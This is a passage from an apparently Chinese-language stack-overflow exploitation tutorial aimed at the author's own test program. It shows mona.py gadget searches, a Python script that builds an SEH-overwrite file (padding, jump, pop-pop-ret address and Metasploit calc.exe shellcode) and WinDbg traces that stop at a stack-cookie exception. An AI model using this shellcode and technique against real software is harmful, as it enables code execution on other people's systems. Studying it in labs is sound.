Hold <span class="hljs-keyword">on</span>...
[&#43;] Command used:
!py mona.py fw -s pop r32#pop r32#ret -m ntdll,kernel32

---------- Mona command started <span class="hljs-keyword">on</span> <span class="hljs-number">2016</span>-<span class="hljs-number">12</span>-<span class="hljs-number">14</span> <span class="hljs-number">05</span>:<span class="hljs-number">50</span>:<span class="hljs-number">08</span> (v2<span class="hljs-number">.0</span>, rev <span class="hljs-number">562</span>) ----------
[&#43;] Processing arguments <span class="hljs-keyword">and</span> criteria
    - Pointer access level : X
    - Only querying modules ntdll,kernel32
[&#43;] Type of search: str
[&#43;] Searching <span class="hljs-keyword">for</span> matches up <span class="hljs-keyword">to</span> <span class="hljs-number">8</span> instructions deep
[&#43;] Generating module info table, hang <span class="hljs-keyword">on</span>...
    - Processing modules
    - Done. <span class="hljs-keyword">Let</span><span class="hljs-comment">&#39;s rock &#39;n roll.</span>
[&#43;] Started search (<span class="hljs-number">8</span> start patterns)
[&#43;] Searching startpattern between <span class="hljs-number">0x77320000</span> <span class="hljs-keyword">and</span> <span class="hljs-number">0x774a0000</span>
[&#43;] Searching startpattern between <span class="hljs-number">0x74ba0000</span> <span class="hljs-keyword">and</span> <span class="hljs-number">0x74cb0000</span>
[&#43;] Preparing output file <span class="hljs-comment">&#39;findwild.txt&#39;</span>
    - (Re)setting logfile c:\mona\test_x86_wo_safeseh_dep\findwild.txt
[&#43;] Writing results <span class="hljs-keyword">to</span> c:\mona\test_x86_wo_safeseh_dep\findwild.txt
[&#43;] Results : 
<span class="hljs-number">0x7735fd82</span> |   <span class="hljs-number">0x7735fd82</span> (b&#43;<span class="hljs-number">0x0003fd82</span>)  : pop edi # pop esi # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x77380414</span> |   <span class="hljs-number">0x77380414</span> (b&#43;<span class="hljs-number">0x00060414</span>)  : pop edi # pop esi # retn | ascii {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x7739a4e7</span> |   <span class="hljs-number">0x7739a4e7</span> (b&#43;<span class="hljs-number">0x0007a4e7</span>)  : pop edi # pop esi # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x773c16db</span> |   <span class="hljs-number">0x773c16db</span> (b&#43;<span class="hljs-number">0x000a16db</span>)  : pop edi # pop esi # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x773c615e</span> |   <span class="hljs-number">0x773c615e</span> (b&#43;<span class="hljs-number">0x000a615e</span>)  : pop edi # pop esi # retn | asciiprint,ascii {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x74bbd63d</span> |   <span class="hljs-number">0x74bbd63d</span> (b&#43;<span class="hljs-number">0x0001d63d</span>)  : pop edi # pop esi # retn |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17651</span> (C:\Windows\syswow64\kernel32.dll)
<span class="hljs-number">0x74c56af6</span> |   <span class="hljs-number">0x74c56af6</span> (b&#43;<span class="hljs-number">0x000b6af6</span>)  : pop edi # pop esi # retn |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17651</span> (C:\Windows\syswow64\kernel32.dll)
<span class="hljs-number">0x7735b440</span> |   <span class="hljs-number">0x7735b440</span> (b&#43;<span class="hljs-number">0x0003b440</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x7735f570</span> |   <span class="hljs-number">0x7735f570</span> (b&#43;<span class="hljs-number">0x0003f570</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x77397345</span> |   <span class="hljs-number">0x77397345</span> (b&#43;<span class="hljs-number">0x00077345</span>)  : pop esi # pop ebx # retn | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x773991d6</span> |   <span class="hljs-number">0x773991d6</span> (b&#43;<span class="hljs-number">0x000791d6</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x7739be98</span> |   <span class="hljs-number">0x7739be98</span> (b&#43;<span class="hljs-number">0x0007be98</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x773ee9d3</span> |   <span class="hljs-number">0x773ee9d3</span> (b&#43;<span class="hljs-number">0x000ce9d3</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x74bdd75d</span> |   <span class="hljs-number">0x74bdd75d</span> (b&#43;<span class="hljs-number">0x0003d75d</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17651</span> (C:\Windows\syswow64\kernel32.dll)
<span class="hljs-number">0x74bdd916</span> |   <span class="hljs-number">0x74bdd916</span> (b&#43;<span class="hljs-number">0x0003d916</span>)  : pop esi # pop ebx # retn |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17651</span> (C:\Windows\syswow64\kernel32.dll)
<span class="hljs-number">0x7735277b</span> |   <span class="hljs-number">0x7735277b</span> (b&#43;<span class="hljs-number">0x0003277b</span>)  : pop ebp # pop ebx # retn <span class="hljs-number">14</span>h | asciiprint,ascii {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x7739bdef</span> |   <span class="hljs-number">0x7739bdef</span> (b&#43;<span class="hljs-number">0x0007bdef</span>)  : pop edi # pop ebx # retn <span class="hljs-number">10</span>h |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x77352b3e</span> |   <span class="hljs-number">0x77352b3e</span> (b&#43;<span class="hljs-number">0x00032b3e</span>)  : pop ebx # pop ebp # retn <span class="hljs-number">10</span>h | asciiprint,ascii {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x7735aa59</span> |   <span class="hljs-number">0x7735aa59</span> (b&#43;<span class="hljs-number">0x0003aa59</span>)  : pop ebx # pop ebp # retn <span class="hljs-number">10</span>h |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
<span class="hljs-number">0x7735f761</span> |   <span class="hljs-number">0x7735f761</span> (b&#43;<span class="hljs-number">0x0003f761</span>)  : pop ebx # pop ebp # retn <span class="hljs-number">10</span>h |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: <span class="hljs-literal">True</span>, Rebase: <span class="hljs-literal">False</span>, SafeSEH: <span class="hljs-literal">True</span>, OS: <span class="hljs-literal">True</span>, v6<span class="hljs-number">.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> (ntdll.dll)
... Please wait <span class="hljs-keyword">while</span> I<span class="hljs-comment">&#39;m processing all remaining results and writing everything to file...</span>
[&#43;] Done. Only the first <span class="hljs-number">20</span> pointers are shown here. <span class="hljs-keyword">For</span> more pointers, open c:\mona\test_x86_wo_safeseh_dep\findwild.txt...
    Found a total of <span class="hljs-number">1090</span> pointers</code></pre> 
<p>这里&#xff0c;我们直接使用第一个搜索到的指令地址&#xff0c;构建下面的Python脚本&#xff0c;快速生成msg.dat文件。</p> 
<pre class="prettyprint"><code class=" hljs tex">import struct
output &#61; r&#39;msg.dat&#39;
<span class="hljs-special">#</span> ntdll.dll
ntdll &#61; 0x77320000   
<span class="hljs-special">#</span> windows/exec - 193 bytes
<span class="hljs-special">#</span> http://www.metasploit.com
<span class="hljs-special">#</span> VERBOSE&#61;false, PrependMigrate&#61;false, EXITFUNC&#61;process, 
<span class="hljs-special">#</span> CMD&#61;calc.exe
buf &#61;  &#34;&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xfc</span><span class="hljs-command">\xe</span>8<span class="hljs-command">\x</span>82<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>60<span class="hljs-command">\x</span>89<span class="hljs-command">\xe</span>5<span class="hljs-command">\x</span>31<span class="hljs-command">\xc</span>0<span class="hljs-command">\x</span>64<span class="hljs-command">\x</span>8b&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>50<span class="hljs-command">\x</span>30<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>0c<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>14<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>72<span class="hljs-command">\x</span>28<span class="hljs-command">\x</span>0f<span class="hljs-command">\xb</span>7&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>4a<span class="hljs-command">\x</span>26<span class="hljs-command">\x</span>31<span class="hljs-command">\xff</span><span class="hljs-command">\xac</span><span class="hljs-command">\x</span>3c<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>7c<span class="hljs-command">\x</span>02<span class="hljs-command">\x</span>2c<span class="hljs-command">\x</span>20<span class="hljs-command">\xc</span>1<span class="hljs-command">\xcf</span>&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>0d<span class="hljs-command">\x</span>01<span class="hljs-command">\xc</span>7<span class="hljs-command">\xe</span>2<span class="hljs-command">\xf</span>2<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>57<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>10<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>4a<span class="hljs-command">\x</span>3c&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>4c<span class="hljs-command">\x</span>11<span class="hljs-command">\x</span>78<span class="hljs-command">\xe</span>3<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>1<span class="hljs-command">\x</span>51<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>59<span class="hljs-command">\x</span>20<span class="hljs-command">\x</span>01&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xd</span>3<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>49<span class="hljs-command">\x</span>18<span class="hljs-command">\xe</span>3<span class="hljs-command">\x</span>3a<span class="hljs-command">\x</span>49<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>34<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>6<span class="hljs-command">\x</span>31&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xff</span><span class="hljs-command">\xac</span><span class="hljs-command">\xc</span>1<span class="hljs-command">\xcf</span><span class="hljs-command">\x</span>0d<span class="hljs-command">\x</span>01<span class="hljs-command">\xc</span>7<span class="hljs-command">\x</span>38<span class="hljs-command">\xe</span>0<span class="hljs-command">\x</span>75<span class="hljs-command">\xf</span>6<span class="hljs-command">\x</span>03<span class="hljs-command">\x</span>7d&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xf</span>8<span class="hljs-command">\x</span>3b<span class="hljs-command">\x</span>7d<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>75<span class="hljs-command">\xe</span>4<span class="hljs-command">\x</span>58<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>58<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>3<span class="hljs-command">\x</span>66&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>0c<span class="hljs-command">\x</span>4b<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>58<span class="hljs-command">\x</span>1c<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>3<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>0&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>89<span class="hljs-command">\x</span>44<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>5b<span class="hljs-command">\x</span>5b<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>59<span class="hljs-command">\x</span>5a<span class="hljs-command">\x</span>51<span class="hljs-command">\xff</span><span class="hljs-command">\xe</span>0<span class="hljs-command">\x</span>5f&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>5f<span class="hljs-command">\x</span>5a<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>12<span class="hljs-command">\xeb</span><span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>5d<span class="hljs-command">\x</span>6a<span class="hljs-command">\x</span>01<span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>85<span class="hljs-command">\xb</span>2<span class="hljs-command">\x</span>00&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>50<span class="hljs-command">\x</span>68<span class="hljs-command">\x</span>31<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>6f<span class="hljs-command">\x</span>87<span class="hljs-command">\xff</span><span class="hljs-command">\xd</span>5<span class="hljs-command">\xbb</span><span class="hljs-command">\xf</span>0<span class="hljs-command">\xb</span>5&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xa</span>2<span class="hljs-command">\x</span>56<span class="hljs-command">\x</span>68<span class="hljs-command">\xa</span>6<span class="hljs-command">\x</span>95<span class="hljs-command">\xbd</span><span class="hljs-command">\x</span>9d<span class="hljs-command">\xff</span><span class="hljs-command">\xd</span>5<span class="hljs-command">\x</span>3c<span class="hljs-command">\x</span>06<span class="hljs-command">\x</span>7c<span class="hljs-command">\x</span>0a&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>80<span class="hljs-command">\xfb</span><span class="hljs-command">\xe</span>0<span class="hljs-command">\x</span>75<span class="hljs-command">\x</span>05<span class="hljs-command">\xbb</span><span class="hljs-command">\x</span>47<span class="hljs-command">\x</span>13<span class="hljs-command">\x</span>72<span class="hljs-command">\x</span>6f<span class="hljs-command">\x</span>6a<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>53&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xff</span><span class="hljs-command">\xd</span>5<span class="hljs-command">\x</span>63<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>6c<span class="hljs-command">\x</span>63<span class="hljs-command">\x</span>2e<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>78<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>00&#34;

with open(output, &#39;wb&#39;) as f:
    shellcode &#61; buf
    jmp_code &#61; struct.pack(&#39;&lt;I&#39;, 0xeb069090)
    addr_pop_pop_ret &#61; struct.pack(&#39;&lt;I&#39;, ntdll &#43; 0x3fd82)
    data &#61; &#39;a&#39;*84 &#43; jmp_code &#43; addr_pop_pop_ret &#43; shellcode
    f.write(data)</code></pre> 
<p>用生成好的msg.dat文件调试&#xff0c;会发现这样的msg.dat&#xff0c;会导致异常&#xff0c;而这个异常是由于stack security checking导致的。</p> 
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; bp test_x86_wo_safeseh_dep&#43;<span class="hljs-number">10E7</span>
*** WARNING: Unable to verify checksum <span class="hljs-keyword">for</span> test_x86_wo_safeseh_dep.exe
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; bl
 <span class="hljs-number">0</span> e <span class="hljs-number">012</span>a10e7     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span>:**** test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; u test_x86_wo_safeseh_dep&#43;<span class="hljs-number">10E7</span> l1
test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span> [z:\d_disk\workspace\vs_2012\test\stack_overflow.cpp &#64; <span class="hljs-number">22</span>]:
<span class="hljs-number">012</span>a10e7 ff1598202a01    call    dword ptr [test_x86_wo_safeseh_dep!_imp__fread (<span class="hljs-number">012</span>a2098)]
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; g
Breakpoint <span class="hljs-number">0</span> hit
eax&#61;<span class="hljs-number">0017f</span>afc ebx&#61;<span class="hljs-number">73837060</span> ecx&#61;<span class="hljs-number">000000</span>c8 edx&#61;<span class="hljs-number">0020</span>dd78 esi&#61;<span class="hljs-number">000000</span>c8 edi&#61;<span class="hljs-number">00000000</span>
eip&#61;<span class="hljs-number">012</span>a10e7 esp&#61;<span class="hljs-number">0017f</span>adc ebp&#61;<span class="hljs-number">0017f</span>b20 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl nz na pe nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00000206</span>
test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span>:
<span class="hljs-number">012</span>a10e7 ff1598202a01    call    dword ptr [test_x86_wo_safeseh_dep!_imp__fread (<span class="hljs-number">012</span>a2098)] ds:<span class="hljs-number">002</span>b:<span class="hljs-number">012</span>a2098&#61;{MSVCR110!fread (<span class="hljs-number">737888f</span>c)}
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; p
eax&#61;<span class="hljs-number">000000</span>c8 ebx&#61;<span class="hljs-number">73837060</span> ecx&#61;<span class="hljs-number">737888</span>dc edx&#61;<span class="hljs-number">00000000</span> esi&#61;<span class="hljs-number">000000</span>c8 edi&#61;<span class="hljs-number">00000000</span>
eip&#61;<span class="hljs-number">012</span>a10ed esp&#61;<span class="hljs-number">0017f</span>adc ebp&#61;<span class="hljs-number">0017f</span>b20 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl nz na pe nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00000206</span>
test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xed</span>:
<span class="hljs-number">012</span>a10ed <span class="hljs-number">8</span>b45d8          mov     eax,dword ptr [ebp-<span class="hljs-number">28</span>h] ss:<span class="hljs-number">002</span>b:<span class="hljs-number">0017f</span>af8&#61;<span class="hljs-number">0000011</span>d
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dd esp l200
<span class="hljs-number">0017f</span>adc  <span class="hljs-number">0017f</span>afc <span class="hljs-number">00000001</span> <span class="hljs-number">000000</span>c8 <span class="hljs-number">73837060</span>
<span class="hljs-number">0017f</span>aec  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000001</span> <span class="hljs-number">0000011</span>d
<span class="hljs-number">0017f</span>afc  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0017f</span>b0c  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0017f</span>b1c  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0017f</span>b2c  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0017f</span>b3c  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0017f</span>b4c  <span class="hljs-number">61616161</span> eb069090 <span class="hljs-number">7735f</span>d82 <span class="hljs-number">0082e8</span>fc
<span class="hljs-number">0017f</span>b5c  <span class="hljs-number">89600000</span> <span class="hljs-number">64</span>c031e5 <span class="hljs-number">8</span>b30508b <span class="hljs-number">528</span>b0c52
<span class="hljs-number">0017f</span>b6c  <span class="hljs-number">28728</span>b14 <span class="hljs-number">264</span>ab70f <span class="hljs-number">3</span>cacff31 <span class="hljs-number">2</span>c027c61
<span class="hljs-number">0017f</span>b7c  <span class="hljs-number">0</span>dcfc120 f2e2c701 <span class="hljs-number">528</span>b5752 <span class="hljs-number">3</span>c4a8b10
<span class="hljs-number">0017f</span>b8c  <span class="hljs-number">78114</span>c8b d10148e3 <span class="hljs-number">20598</span>b51 <span class="hljs-number">498</span>bd301
<span class="hljs-number">0017f</span>b9c  <span class="hljs-number">493</span>ae318 <span class="hljs-number">018</span>b348b acff31d6 <span class="hljs-number">010</span>dcfc1
<span class="hljs-number">0017f</span>bac  <span class="hljs-number">75e038</span>c7 f87d03f6 <span class="hljs-number">75247</span>d3b <span class="hljs-number">588</span>b58e4
<span class="hljs-number">0017f</span>bbc  <span class="hljs-number">66</span>d30124 <span class="hljs-number">8</span>b4b0c8b <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0017f</span>bcc  <span class="hljs-number">012</span>a13a2 <span class="hljs-number">7</span>efde000 <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0017f</span>bdc  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
...
<span class="hljs-number">0017f</span>fcc  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0017f</span>fdc  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0017f</span>fec  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; ba e1 <span class="hljs-number">0017f</span>b4c&#43;<span class="hljs-number">8</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; bl
 <span class="hljs-number">0</span> e <span class="hljs-number">012</span>a10e7     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span>:**** test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span>
 <span class="hljs-number">1</span> e <span class="hljs-number">0017f</span>b54 e <span class="hljs-number">1</span> <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span>:**** 
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; g
Breakpoint <span class="hljs-number">0</span> hit
eax&#61;<span class="hljs-number">0017f</span>bc4 ebx&#61;<span class="hljs-number">73837060</span> ecx&#61;<span class="hljs-number">000000</span>c8 edx&#61;<span class="hljs-number">00000000</span> esi&#61;<span class="hljs-number">00000055</span> edi&#61;<span class="hljs-number">000000</span>c8
eip&#61;<span class="hljs-number">012</span>a10e7 esp&#61;<span class="hljs-number">0017f</span>adc ebp&#61;<span class="hljs-number">0017f</span>b20 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl nz ac po nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00000212</span>
test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span>:
<span class="hljs-number">012</span>a10e7 ff1598202a01    call    dword ptr [test_x86_wo_safeseh_dep!_imp__fread (<span class="hljs-number">012</span>a2098)] ds:<span class="hljs-number">002</span>b:<span class="hljs-number">012</span>a2098&#61;{MSVCR110!fread (<span class="hljs-number">737888f</span>c)}
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; g
STATUS_STACK_BUFFER_OVERRUN encountered
(<span class="hljs-number">4</span>cc.b20): Break instruction exception - code <span class="hljs-number">80000003</span> (first chance)
eax&#61;<span class="hljs-number">00000000</span> ebx&#61;<span class="hljs-number">012</span>a2108 ecx&#61;<span class="hljs-number">74</span>bf01b8 edx&#61;<span class="hljs-number">0017f</span>4e1 esi&#61;<span class="hljs-number">00000000</span> edi&#61;<span class="hljs-number">00000000</span>
